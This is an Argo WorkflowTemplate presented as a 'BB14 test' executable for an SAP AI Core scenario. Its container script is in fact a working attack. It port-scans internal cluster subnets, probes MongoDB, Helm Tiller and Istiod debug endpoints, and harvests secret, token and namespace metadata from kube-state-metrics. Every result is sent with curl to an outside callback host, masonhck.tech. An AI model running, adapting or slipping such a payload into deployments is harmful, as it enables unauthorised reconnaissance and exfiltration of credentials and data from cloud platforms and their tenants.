apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "9.0.1"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - sh
      - -c
      - |
        CB="https://www.masonhck.tech/cb.php"
        post() { curl -k -s -X POST "${CB}?src=$1" --max-time 10 -d @- ; }
        get() { curl -k -s "${CB}?src=$1" --max-time 5 ; }

        get "recon9-start-$(hostname)"

        # === 1. TARGETED SCAN: Find MongoDB and Tiller IPs ===
        nmap -sT -T4 --open --min-rate 1000 -p 27017,44134,15014 100.104.0.0/24 -oG /tmp/targeted.txt 2>&1 | tail -3 | post "recon9-targeted-summary"
        grep "Ports:" /tmp/targeted.txt | post "recon9-targeted-hosts"

        # === 2. MONGODB PROBE ===
        MONGO_IP=$(grep "27017/open" /tmp/targeted.txt | head -1 | awk '{print $2}')
        echo "mongo_ip=${MONGO_IP}" | post "recon9-mongo-ip"

        if [ -n "$MONGO_IP" ]; then
          curl -s --connect-timeout 3 "http://${MONGO_IP}:28017/" 2>&1 | head -c 700 | post "recon9-mongo-http"
          timeout 10 mongosh --host ${MONGO_IP} --port 27017 --eval "db.adminCommand('listDatabases')" --quiet 2>&1 | head -c 1800 | post "recon9-mongo-listdb"
          timeout 10 mongo --host ${MONGO_IP} --port 27017 --eval "db.adminCommand('listDatabases')" --quiet 2>&1 | head -c 1800 | post "recon9-mongo-legacy"
          echo "" | timeout 5 ncat ${MONGO_IP} 27017 2>&1 | xxd | head -c 700 | post "recon9-mongo-banner"
        fi

        # === 3. TILLER PROBE (port 44134) ===
        TILLER_IP=$(grep "44134/open" /tmp/targeted.txt | head -1 | awk '{print $2}')
        echo "tiller_ip=${TILLER_IP}" | post "recon9-tiller-ip"

        if [ -n "$TILLER_IP" ]; then
          curl -s --connect-timeout 3 "http://${TILLER_IP}:44134/" 2>&1 | head -c 700 | post "recon9-tiller-http"
          which grpcurl 2>&1 | post "recon9-grpcurl-check"
          grpcurl -plaintext ${TILLER_IP}:44134 list 2>&1 | head -c 700 | post "recon9-tiller-grpc"
          echo "" | timeout 3 ncat ${TILLER_IP} 44134 2>&1 | xxd | head -c 700 | post "recon9-tiller-banner"
          which helm 2>&1 | post "recon9-helm-check"
        fi

        # === 4. ISTIOD PROBE (port 15014) ===
        ISTIOD_IP=$(grep "15014/open" /tmp/targeted.txt | head -1 | awk '{print $2}')
        echo "istiod_ip=${ISTIOD_IP}" | post "recon9-istiod-ip"

        if [ -n "$ISTIOD_IP" ]; then
          curl -s --connect-timeout 3 "http://${ISTIOD_IP}:15014/debug/configz" 2>&1 | head -c 1800 | post "recon9-istiod-configz"
          curl -s --connect-timeout 3 "http://${ISTIOD_IP}:15014/debug/endpointz" 2>&1 | head -c 1800 | post "recon9-istiod-endpointz"
          curl -s --connect-timeout 3 "http://${ISTIOD_IP}:15014/debug/registryz" 2>&1 | head -c 1800 | post "recon9-istiod-registryz"
          curl -s --connect-timeout 3 "http://${ISTIOD_IP}:15014/debug/syncz" 2>&1 | head -c 1800 | post "recon9-istiod-syncz"
          curl -s --connect-timeout 3 "http://${ISTIOD_IP}:15014/debug/authorizationz" 2>&1 | head -c 1800 | post "recon9-istiod-authz"
          curl -s --connect-timeout 3 "http://${ISTIOD_IP}:8080/debug/configz" 2>&1 | head -c 700 | post "recon9-istiod-8080"
        fi

        # === 5. EXTENDED PORT SCAN (just hot ports, wider ranges) ===
        for i in 1 2 3 4 5 7 8 9 10 50 100 150 178 200; do
          nmap -sT -T4 --open --min-rate 1000 -p 27017,44134,2379,3100,5432,6379,9200 100.104.${i}.0/24 -oG - 2>/dev/null | grep "Ports:" >> /tmp/extended.txt
        done
        wc -l /tmp/extended.txt 2>/dev/null | post "recon9-extended-count"
        cat /tmp/extended.txt 2>/dev/null | head -c 1800 | post "recon9-extended-open"

        # === 6. POD SUBNET ===
        MY_IP=$(ip -4 addr show eth0 2>/dev/null | grep inet | awk '{print $2}' | cut -d/ -f1)
        MY_NET=$(echo $MY_IP | sed 's/\.[0-9]*$/.0/')
        echo "pod_ip=${MY_IP}" | post "recon9-pod-ip"
        nmap -sT -T4 --open --min-rate 1000 -p 27017,44134,2379,3100,8080,9200 ${MY_NET}/24 -oG - 2>/dev/null | grep "Ports:" | head -c 1800 | post "recon9-pod-subnet"

        # === 7. KSM FULL DUMP ===
        curl -s --connect-timeout 10 "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm_pods.txt 2>&1
        wc -c /tmp/ksm_pods.txt | post "recon9-ksm-pods-size"
        grep "kube_pod_info" /tmp/ksm_pods.txt | head -20 | head -c 1800 | post "recon9-ksm-pod-info-1"
        grep "kube_pod_info" /tmp/ksm_pods.txt | sed -n '20,40p' | head -c 1800 | post "recon9-ksm-pod-info-2"
        grep "kube_secret" /tmp/ksm_pods.txt | head -c 1800 | post "recon9-ksm-secrets"
        grep -oE 'namespace="[^"]*"' /tmp/ksm_pods.txt | sort -u | head -c 1800 | post "recon9-ksm-namespaces"

        curl -s --connect-timeout 10 "http://ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm_custom.txt 2>&1
        wc -c /tmp/ksm_custom.txt | post "recon9-ksm-custom-size"
        grep -i "secret\|cert\|key\|credential\|token" /tmp/ksm_custom.txt | head -c 1800 | post "recon9-ksm-custom-secrets"

        curl -s --connect-timeout 10 "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm_multi.txt 2>&1
        wc -c /tmp/ksm_multi.txt | post "recon9-ksm-multi-size"
        grep "kube_secret_info\|kube_configmap_info" /tmp/ksm_multi.txt | head -c 1800 | post "recon9-ksm-multi-secrets"
        grep -oE 'namespace="[^"]*"' /tmp/ksm_multi.txt | sort -u | head -c 700 | post "recon9-ksm-multi-ns"

        get "recon9-done-$(hostname)"
      resources:
        limits:
          cpu: "2"
          memory: "2Gi"
        requests:
          cpu: "500m"
          memory: "512Mi"
